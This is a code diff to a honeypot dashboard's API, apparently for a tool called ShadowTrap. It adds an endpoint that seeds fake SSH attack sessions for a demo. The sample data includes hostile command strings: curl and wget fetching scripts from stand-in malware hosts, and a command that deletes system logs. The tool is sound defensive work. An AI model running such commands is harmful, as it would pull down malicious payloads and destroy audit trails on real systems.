@@ -99,19 +99,47 @@ def clear_stats(db: Session = Depends(get_db)):
     db.commit()
     return {"status": "cleared"}
 
-@router.post("/simulate", dependencies=[Depends(verify_auth)])
-async def simulate_event(data: dict):
+@router.post("/simulate-global", dependencies=[Depends(verify_auth)])
+async def simulate_global(db: Session = Depends(get_db)):
+    from database.models import SSHSession
+    import uuid
+    import datetime
     from dashboard.live_ws import manager
-    await manager.broadcast(data)
+    from intelligence.geoip_engine import geoip_engine
     
-    # Trigger Telegram alert for simulation if risk is high
-    if data.get("risk_score", 0) > 80:
-        from intelligence.telegram_alert import send_telegram_alert
-        msg = f"🛡️ **ShadowTrap SIMULATION ALERT**\n\n"
-        msg += f"IP: `{data.get('ip')}`\n"
-        msg += f"Country: {data.get('location', {}).get('country')}\n"
-        msg += f"Cmd: `{data.get('command')}`\n"
-        msg += f"Risk: `{data.get('risk_score')}`"
-        send_telegram_alert(msg)
+    # Fake global threat data for demo
+    threats = [
+        {"ip": "95.161.225.100", "cmd": "curl http://miner.pool/start.sh", "risk": 90, "tactic": "Initial Access", "country": "Russia"},
+        {"ip": "103.250.164.12", "cmd": "rm -rf /var/log/*", "risk": 85, "tactic": "Impact", "country": "China"},
+        {"ip": "52.95.245.101", "cmd": "wget http://malware.xyz/payload.py", "risk": 70, "tactic": "Execution", "country": "USA"},
+    ]
+    
+    for t in threats:
+        session_id = str(uuid.uuid4())
+        session = SSHSession(
+            session_id=session_id,
+            ip_address=t['ip'],
+            username="root",
+            password="password123",
+            command=t['cmd'],
+            risk_score=t['risk'],
+            attacker_type="Advanced Persistent Threat",
+            mitre_tactic=t['tactic'],
+            timestamp=datetime.datetime.now()
+        )
+        db.add(session)
         
-    return {"status": "event_simulated"}
+        # Broadcast live to dashboard
+        await manager.broadcast({
+            "session_id": session_id,
+            "ip": t['ip'],
+            "location": geoip_engine.get_location(t['ip']),
+            "user": "root",
+            "command": t['cmd'],
+            "risk_score": t['risk'],
+            "mitre_tactic": t['tactic'],
+            "patterns": ["Simulation Mode Active"]
+        })
+    
+    db.commit()
+    return {"status": "Global threats deployed"}
